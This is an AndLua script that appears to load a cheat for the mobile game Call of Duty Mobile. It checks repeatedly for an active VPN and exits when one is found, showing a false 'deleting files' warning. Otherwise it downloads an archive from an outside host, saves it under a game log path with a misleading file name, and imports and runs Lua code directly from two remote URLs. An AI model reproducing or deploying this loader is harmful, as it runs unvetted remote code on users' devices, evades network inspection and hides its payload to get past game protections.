require "import"
import "http"
import "zip4j"

--zip4j.unZipDir(activity.getLuaDir("/libs/classes.dex"),
--activity.getLuaDir(""),"FC6WH7wg_Y!R-$c9R@KJYAAf5=P5acvQg-j_^JT+SJTj37c9Pu#$f7Kr87n78XeF4v-e26kCgApz9_7m?hj9b=P=&!p43abQx^Ew")

local function isVpnUsed()
  import "java.net.NetworkInterface"
  import "java.util.Collections"
  import "java.util.Enumeration"
  import "java.util.Iterator"
  local nlp= NetworkInterface.getNetworkInterfaces();
  if (nlp~=nil) then
    local it = Collections.list(nlp).iterator();
    while (it.hasNext()) do
      local nlo = it.next();
      if (nlo.isUp() && nlo.getInterfaceAddresses().size() ~= 0) then
        if ((tostring(nlo):find("tun0")) or (tostring(nlo):find("ppp0"))) then
          return true
        end
      end
    end
    return false
  end
end
local y=pcall(function()
  local ti=Ticker()
  ti.Period=100
  ti.start()
  ti.onTick=function()
    pcall(function()
      if isVpnUsed() then
        if w==nil then
          Toast.makeText(activity, "ᴅᴇʟᴇᴛɪɴɢ ꜰɪʟᴇꜱ !! ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ ...",Toast.LENGTH_SHORT).show()
          w=0
          task(500,function()
            os.exit()
            ti.stop()
            activity.finish()
          end)
        end
       else
        if w==nil then
          loader()
          w=0
        end
      end
    end)
  end
  function onDestroy()
    ti.stop()
  end
end)



function loader()
  import "com.downloader.*"
  pkgName = "com.garena.game.codm"
  FILEDOWNLOAD = "/storage/emulated/0/centauri/Log/" .. pkgName .. "/centauriLog2.mmap"
  Urls="https://key.itsmerjc.pro/data.zip"

  if !io.open(FILEDOWNLOAD, "r") then
    if downloadIdOne==nil
      dl=ProgressDialog.show(activity,nil,'ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ ...')
      dl.show()
      downloadIdOne = PRDownloader.download(Urls, "/storage/emulated/0/centauri/Log/" .. pkgName .. "", "centauriLog2.mmap").build()
      .setOnStartOrResumeListener({
        onStartOrResume=function()
        end
      })
      .start({
        onDownloadComplete=function()
          downloadIdOne=nil
          dl.dismiss()
          Toast.makeText(this, "ᴅᴏᴡɴʟᴏᴀᴅ ꜱᴜᴄᴄᴇꜱꜱ !!!", Toast.LENGTH_SHORT).show();
          import "https://key.itsmerjc.pro/andlua.lua"
        end,
        onError=function(error)
          downloadIdOne=nil
          dl.dismiss()
          Toast.makeText(this, "ᴅᴏᴡɴʟᴏᴀᴅ ᴇʀʀᴏʀ !!!"..tostring(error), Toast.LENGTH_SHORT).show();
          os.exit()
        end
      });
     else
    end
   else
    Toast.makeText(activity, "ꜰɪʟᴇꜱ ʜᴀꜱ ʙᴇᴇɴ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ !!!",Toast.LENGTH_SHORT).show()
    import "http://itsmefiles.mywebcommunity.org/main2.lua"
  end
end
